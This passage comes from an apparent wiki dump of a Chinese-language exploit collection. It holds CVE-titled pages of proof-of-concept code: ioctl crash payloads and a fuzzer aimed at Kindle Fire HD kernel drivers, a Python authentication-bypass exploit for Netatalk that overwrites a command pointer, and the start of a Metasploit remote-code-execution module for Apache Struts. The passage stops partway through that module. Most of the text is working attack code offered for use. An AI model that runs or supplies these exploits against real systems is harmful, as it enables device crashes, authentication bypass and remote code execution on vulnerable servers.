    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>7balnemcdhirwgtgmwl1aubz1e8in74</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11021 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3071</id>
    <revision>
      <id>3572</id>
      <timestamp>2021-05-26T13:48:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2018-11021 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞"</comment>
      <origin>3572</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3973" sha1="jpcnjq9eribeji5ech1dr16y560o08f" xml:space="preserve">&lt;languages  /&gt;
==漏洞影響==
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>jpcnjq9eribeji5ech1dr16y560o08f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11023 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1053</id>
    <revision>
      <id>1332</id>
      <timestamp>2021-04-10T01:43:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;!--T:1--&gt; &lt;/translate&gt; &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; /*  * This is poc of Kindle Fire HD 3rd  * A bug in the ioctl i..."</comment>
      <origin>1332</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1223" sha1="i9h6gu3bhs6b7opdqxb0c6s758w1ker" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. 
 * This Poc should run with permission to do ioctl on /dev/gcioctl.
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/gcioctl";
static command = 3222560159; 

int main(int argc, char **argv, char **env) {
        unsigned int payload[] = { 0x244085aa, 0x1a03e6ef, 0x000003f4, 0x00000000 };

        int fd = 0;

        fd = open(driver, O_RDONLY);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>i9h6gu3bhs6b7opdqxb0c6s758w1ker</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11024 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1056</id>
    <revision>
      <id>1335</id>
      <timestamp>2021-04-10T01:44:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;!--T:1--&gt; &lt;/translate&gt; &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; #include&lt;stdio.h&gt; #include&lt;string.h&gt;      //strlen #include&lt;sys..."</comment>
      <origin>1335</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12964" sha1="rvmk4pj34kvhroq0qafq3snngpy3emo" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;      //strlen
#include&lt;sys/socket.h&gt;
#include&lt;arpa/inet.h&gt; //inet_addr
#include&lt;unistd.h&gt;      //write
#include &lt;stdlib.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdbool.h&gt;

// Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/

/*
 seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs
*/
int debug = 1;

typedef struct {
    int src_id;
    int dst_id;
    int offset;
} map_entry_t;

short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1};
int *small_vals;
int num_small_vals;

// populates small_vals when called
void populate_arrs(int top) {
    int num = 1;
    int count = 0;
    while (num &lt; top) {
        //printf("%d\n", num);
        num &lt;&lt;= 1;
        count += 2;
    }
    // top
    count += 1;
    // -1
    count += 1;
    num_small_vals = count;
    num &gt;&gt;= 1;

    small_vals = malloc(sizeof(int)*count);
    memset(small_vals, 0, count);

    int i = 0;
    while(num &gt; 1) {
        small_vals[i] = num;
        i++;
        small_vals[i] = num-1;
        i++;
        num &gt;&gt;= 1;
    }
    small_vals[i] = 0;
    small_vals[i+1] = top;
    small_vals[i+2] = top-1;
    small_vals[i+3] = -1;
}

// generate a random value of size size and store it in elem.
// value has a weight % chance to be a "small value"
void gen_rand_val(int size, char *elem,  int small_weight) {
    int i;

    if ((rand() % 100) &lt; small_weight) {
        // do small thing
        unsigned int idx = (rand() % num_small_vals);
        printf("Choosing %d\n", small_vals[idx]);
        switch (size) {
            case 2:
                idx = (rand() % 18);
                *(short *)elem = tiny_vals[idx];
                break;
            case 4:
                *(int *)elem = small_vals[idx];
                break;

            case 8:
                *(long long*)elem = small_vals[idx];
                break;

            default:
                printf("Damn bro. Size: %d\n", size);
                exit(-1);
        }
    }

    else {

        for(i=0; i &lt; size; i++) {
            elem[i] = (char)(rand()%0x100);
        }
    }

}

int main(int argc , char *argv[])
{
    int num_blobs = 0, num_mappings = 0, i = 0, dev_name_len = 0, j;
    unsigned int ioctl_id = 0;
    char *dev_name;
    void *tmp;
    char **ptr_arr;
    int *len_arr;
    unsigned int seed;

    int sockfd , client_sock , c , read_size;
    struct sockaddr_in server , client;
    int msg_size;
    void *generic_arr[264];

    // max val for small_vals array
    int top = 8192;
    int cnt = 0;
    // chance that our generics are filled with "small vals"
    int default_weight = 50;
    populate_arrs(top);
    int retest = 1;
    goto rerun;



    sockfd = socket(AF_INET , SOCK_STREAM , 0);
    if (sockfd == -1)
    {
        printf("Could not create socket");
    }
    puts("Socket created");

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int));

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(atoi(argv[1]));

    //Bind
    if( bind(sockfd,(struct sockaddr *)&amp;server , sizeof(server)) &lt; 0)
    {
        //print the error message
        perror("bind failed. Error");
        return 1;
    }
    puts("bind done");
listen:     
    // Listen
    listen(sockfd , 3);

    puts("Waiting for incoming connections...");
    c = sizeof(struct sockaddr_in);

    // accept connection from an incoming client
    client_sock = accept(sockfd, (struct sockaddr *)&amp;client, (socklen_t*)&amp;c);
    if (client_sock &lt; 0)
    {
        perror("accept failed");
        return 1;
    }
    puts("Connection accepted");

    msg_size = 0;
    // Receive a message from client
    while( (read_size = recv(client_sock , &amp;msg_size , 4 , 0)) &gt; 0 )
    {
        // recv the entire message
        char *recv_buf = calloc(msg_size, sizeof(char));
        if (recv_buf == NULL) {
            printf("Failed to allocate recv_buf\n");
            exit(-1);
        }

        int nrecvd = recv(client_sock, recv_buf, msg_size, 0);
        if (nrecvd != msg_size) {
            printf("Error getting all data!\n");
            printf("nrecvd: %d\nmsg_size:%d\n", nrecvd, msg_size);
            exit(-1);
        }
        // quickly save a copy of the most recent data
        int savefd = open("/sdcard/saved", O_WRONLY|O_TRUNC|O_CREAT, 0644);
        if (savefd &lt; 0) {
            perror("open saved");
            exit(-1);
        }

        int err = write(savefd, recv_buf, msg_size);
        if (err != msg_size) {
            perror("write saved");
            exit(-1);
        }
        fsync(savefd);
        close(savefd);
rerun:
        if (retest) {
            recv_buf = calloc(msg_size, sizeof(char));
            int fd = open("/sdcard/saved", O_RDONLY);
            if (fd &lt; 0) {
                perror("open:");
                exit(-1);
            }
            int fsize = lseek(fd, 0, SEEK_END);
            printf("file size: %d\n", fsize);
            lseek(fd, 0, SEEK_SET);
            read(fd, recv_buf, fsize);
        }

        char *head = recv_buf;
        seed = 0;
        //seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blob_len_arr, blobs
        memcpy(&amp;seed, head, 4);
        head += 4;
        memcpy(&amp;ioctl_id, head, 4);
        head += 4;
        memcpy(&amp;num_mappings, head, 4);
        head += 4;
        memcpy(&amp;num_blobs, head, 4);
        head += 4;
        memcpy(&amp;dev_name_len, head, 4);
        head += 4;

        // srand with new seed
        srand(seed);

        /* dev name */
        dev_name = calloc(dev_name_len+1, sizeof(char));
        if (dev_name == NULL) {
            printf("Failed to allocate dev_name\n");
            exit(-1);
        }
        memcpy(dev_name, head, dev_name_len);
        head += dev_name_len;

        /* map */
        map_entry_t *map = calloc(num_mappings, sizeof(map_entry_t));
        if (map == NULL) {
            printf("Failed to allocate map\n");
            exit(-1);
        }

        if (num_mappings != 0) {
            memcpy(map, head, num_mappings*sizeof(map_entry_t));
            head += num_mappings*sizeof(map_entry_t);
        }

        /* blobs */

        // first create an array to store the sizes themselves
        len_arr = calloc(num_blobs, sizeof(int));
        if (len_arr == NULL) {
            printf("Failed to allocate len_arr\n");
            exit(-1);
        }

        // we'll also want an array to store our pointers
        ptr_arr = calloc(num_blobs, sizeof(void *));
        if (ptr_arr == NULL) {
            printf("Failed to allocate ptr_arr\n");
            exit(-1);
        }


        // copy the blob sizes into our size_arr
        for (j=0; j &lt; num_blobs; j++) {
            memcpy(&amp;len_arr[j], head, sizeof(int));
            head += sizeof(int);
        }

        // we'll also want memory bufs for all blobs
        // now that we have the sizes, allocate all the buffers we need
        for (j=0; j &lt; num_blobs; j++) {
            ptr_arr[j] = calloc(len_arr[j], sizeof(char));
            printf("Sizeof(ptr_arr[%d])=%d\n", j, len_arr[j]);
            printf("ptr_arr[%d]=%p\n", j, ptr_arr[j]);

            //printf("just added %p to ptr_arr\n", ptr_arr[j]);
            if (ptr_arr[j] == NULL) {
                printf("Failed to allocate a blob store\n");
                exit(-1);
            }

            // might as well copy the memory over as soon as we allocate the space
            memcpy((char *)ptr_arr[j], head, len_arr[j]);
            printf("ptr_arr[%d]=\n", j);
            for(i=0;i&lt;len_arr[j];i+=4){
                printf("0x%08x\n", *(unsigned int *)(ptr_arr[j] + i));
            }
            printf("\n");

            head += len_arr[j];
        }

        int num_generics = 0;

        // time for pointer fixup
        for (i=0; i &lt; num_mappings; i++) {
            // get out entry
            map_entry_t entry = map[i];
            // pull out the struct to be fixed up
            char *tmp = ptr_arr[entry.src_id];

            // check if this is a struct ptr or just a generic one

            // just a generic one
            if (entry.dst_id &lt; 0) {
                // 90% chance we fixup the generic
                if ( (rand() % 10) &gt; 0) {
                    int buf_len = 128;
                    char *tmp_generic = malloc(buf_len);
                    memset(tmp_generic, 0, buf_len);
                    // 95% chance we fill it with data
                    if ((rand() % 100) &gt; 95) {
                        // if dst_id is &lt; 0, it's abs value is the element size
                        int size = -1 * entry.dst_id;
                        int weight;
                        // if it's a char or some float, never choose a "small val"
                        if (size == 1 || size &gt; 8)
                            weight = 0;
                        else
                            weight = default_weight;

                        for (i=0; i &lt; buf_len; i+=size) {
                            gen_rand_val(size, &amp;tmp_generic[i], weight);
                        }
                    }
                    generic_arr[num_generics] = tmp_generic;
                    memcpy(tmp+entry.offset, &amp;tmp_generic, sizeof(void *));
                    num_generics += 1;
                    if (num_generics &gt;= 264) {
                        printf("Code a better solution for storing generics\n");
                        exit(1);
                    }
                }
            }

            // a struct ptr, so we have the data
            else {
                // 1 in 400 chance we don't fixup
                if ( (rand() % 400) &gt; 0) {
                    // now point it to the correct struct/blob
                    // printf("placing %p, at %p\n", ptr_arr[entry.dst_id], tmp+entry.offset);
                    memcpy(tmp+entry.offset, &amp;ptr_arr[entry.dst_id], sizeof(void *));
                }
            }
        }

        if (debug) {
            printf("ioctl_id: %d\n", ioctl_id);
            printf("num_mappings: %d\n", num_mappings);
            printf("num_blobs: %d\n", num_blobs);
            printf("dev_name_len: %d\n", dev_name_len);
            printf("dev_name: %s\n", dev_name);
            printf("data[]: \n");
            //printf("(0x%x)\n", *(int *)&amp;ptr_arr[0]);
            printf("(0x%p) : ", &amp;ptr_arr[0]);
            printf("(0x%016lx)\n", *(unsigned long int *)ptr_arr[0]);
            printf("(0x%p) : ", (&amp;ptr_arr[0]+1*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+1*8));

            printf("(0x%p) : ", (&amp;ptr_arr[0]+2*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+2*8));

            printf("(0x%p) : ", (&amp;ptr_arr[0]+3*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+3*8));

            printf("(0x%p) : ", (&amp;ptr_arr[0]+4*8));
            printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+4*8));

            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+5*8));
            //printf("(0x%016lx)\n", *(unsigned long int *)(ptr_arr[0]+6*8));

            //printf("(0x%x)\n", (int *)ptr_arr, (int *)ptr_arr);

        }

        // time for the actual ioctl
        //printf("Try to open device %s\n", dev_name);
        //fflush(stdout);
        int fd = open(dev_name, O_RDONLY);
        if (fd &lt; 0) {
            perror("open");
            exit(-1);
        } else {
            printf("Open devicd %s successfully.\n", dev_name);
        }

        //fflush(stdout);
        //printf("Try to call ioctl(fd=%d, ioctl_id=%d, ptr_arr=%p)\n", fd, ioctl_id, ptr_arr[0]);
        fflush(stdout);
        printf("%10d:", cnt++);
        if ((ioctl(fd, ioctl_id, ptr_arr[0])) == -1)
            perror("ioctl");

        else
            printf("good hit\n");
        close(fd);
        printf("device %s closed\n", dev_name);

        if (retest)
            exit(0);

        fflush(stdout);
        // okay now free all the shit we alloced
        free(recv_buf);
        free(dev_name);
        if (map != NULL)
            free(map);
        free(len_arr);
        for (i=0; i &lt; num_blobs; i++) {
            //printf("%d: free'ing %p\n", i, ptr_arr[i]);
            free(ptr_arr[i]);
        }
        free(ptr_arr);
        for (i=0; i &lt; num_generics; i++) {
            free(generic_arr[i]);
        }

        write(client_sock, &amp;msg_size, 4);

        msg_size = 0;
    }

    if(read_size == 0)
    {
        puts("Client disconnected");
        fflush(stdout);
        close(client_sock);
        goto listen;
    }
    else if(read_size == -1)
    {
        perror("recv failed");
    }

    return 0;
}
&lt;/pre&gt;</text>
      <sha1>rvmk4pj34kvhroq0qafq3snngpy3emo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11025 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞</title>
    <ns>0</ns>
    <id>1057</id>
    <revision>
      <id>1336</id>
      <timestamp>2021-04-10T01:45:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;!--T:1--&gt; &lt;/translate&gt; &lt;pre&gt; Fire OS 4.5.5.3 &lt;/pre&gt;  ==POC== &lt;pre&gt; /*  * This is poc of Kindle Fire HD 3rd  * A bug in the ioctl i..."</comment>
      <origin>1336</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1428" sha1="a2p5hy23a53b2c4ut7fgs9tevvmoz45" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/twl6030-gpadc causes 
 * the system crash via IOCTL 24832. 
 *
 * This Poc should run with permission to do ioctl on /dev/twl6030-gpadc.
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/twl6030-gpadc";
static command = 24832; 

struct twl6030_gpadc_user_parms {
    int channel;
    int status;
    unsigned short result;
};


int main(int argc, char **argv, char **env) {
        struct twl6030_gpadc_user_parms payload;
        payload.channel = 0x9b2a9212;
        payload.status = 0x0;
        payload.result = 0x0;

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try ioctl device file '%s', with command 0x%x and payload NULL\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
&lt;/pre&gt;</text>
      <sha1>a2p5hy23a53b2c4ut7fgs9tevvmoz45</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1160 Netatalk 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1197</id>
    <revision>
      <id>1501</id>
      <timestamp>2021-04-11T01:16:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; import socket import struct import sys if len(sys.argv) != 3:     sys.exit(0) ip = sys.argv[1] port = int(sys.argv[2]) sock = socket.socket(socket.AF_INET, socke..."</comment>
      <origin>1501</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1749" sha1="ki7evhideifuwkpi7of4qfz0ewuu4kp" xml:space="preserve">==EXP==
&lt;pre&gt;
import socket
import struct
import sys
if len(sys.argv) != 3:
    sys.exit(0)
ip = sys.argv[1]
port = int(sys.argv[2])
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Attempting connection to " + ip + ":" + sys.argv[2]
sock.connect((ip, port))
dsi_payload = "\x00\x00\x40\x00" # client quantum
dsi_payload += '\x00\x00\x00\x00' # overwrites datasize
dsi_payload += struct.pack("I", 0xdeadbeef) # overwrites quantum
dsi_payload += struct.pack("I", 0xfeedface) # overwrites the ids
dsi_payload += struct.pack("Q", 0x63b660) # overwrite commands ptr
dsi_opensession = "\x01" # attention quantum option
dsi_opensession += struct.pack("B", len(dsi_payload)) # length
dsi_opensession += dsi_payload
dsi_header = "\x00" # "request" flag
dsi_header += "\x04" # open session command
dsi_header += "\x00\x01" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack("&gt;I", len(dsi_opensession))
dsi_header += "\x00\x00\x00\x00" # reserved
dsi_header += dsi_opensession
sock.sendall(dsi_header)
resp = sock.recv(1024)
print "[+] Open Session complete"
afp_command = "\x01" # invoke the second entry in the table
afp_command += "\x00" # protocol defined padding
afp_command += "\x00\x00\x00\x00\x00\x00" # pad out the first entry
afp_command += struct.pack("Q", 0x4295f0) # address to jump to
dsi_header = "\x00" # "request" flag
dsi_header += "\x02" # "AFP" command
dsi_header += "\x00\x02" # request id
dsi_header += "\x00\x00\x00\x00" # data offset
dsi_header += struct.pack("&gt;I", len(afp_command))
dsi_header += '\x00\x00\x00\x00' # reserved
dsi_header += afp_command
print "[+] Sending get server info request"
sock.sendall(dsi_header)
resp = sock.recv(1024)
print resp
print "[+] Fin."

&lt;/pre&gt;</text>
      <sha1>ki7evhideifuwkpi7of4qfz0ewuu4kp</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11776 Apache Struts 2命名空間重定向OGNL注入漏洞</title>
    <ns>0</ns>
    <id>478</id>
    <revision>
      <id>680</id>
      <timestamp>2021-03-27T02:46:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>680</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="15039" sha1="stgnj54qjh1ehbyzg4n8f3iv893r7aj" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  # Eschewing CmdStager for now, since the use of '\' and ';' are killing me
  #include Msf::Exploit::CmdStager   # https://github.com/rapid7/metasploit-framework/wiki/How-to-use-command-stagers

  def initialize(info = {})
    super(update_info(info,
      'Name'           =&gt; 'Apache Struts 2 Namespace Redirect OGNL Injection',
      'Description'    =&gt; %q{
        This module exploits a remote code execution vulnerability in Apache Struts
        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed
        via an endpoint that makes use of a redirect action.

        Native payloads will be converted to executables and dropped in the
        server's temp dir. If this fails, try a cmd/* payload, which won't
        have to write to the disk.
      },
      #TODO: Is that second paragraph above still accurate?
      'Author'         =&gt; [
        'Man Yue Mo', # Discovery
        'hook-s3c',   # PoC
        'asoto-r7',   # Metasploit module
        'wvu'         # Metasploit module
      ],
      'References'     =&gt; [
        ['CVE', '2018-11776'],
        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2018-11776'],
        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-057'],
        ['URL', 'https://github.com/hook-s3c/CVE-2018-11776-Python-PoC'],
      ],
      'Privileged'     =&gt; false,
      'Targets'        =&gt; [
        [
          'Automatic detection', {
            'Platform'   =&gt; %w{ unix windows linux },
            'Arch'       =&gt; [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
        [
          'Windows', {
            'Platform'   =&gt; %w{ windows },
            'Arch'       =&gt; [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
        [
          'Linux', {
            'Platform'       =&gt; %w{ unix linux },
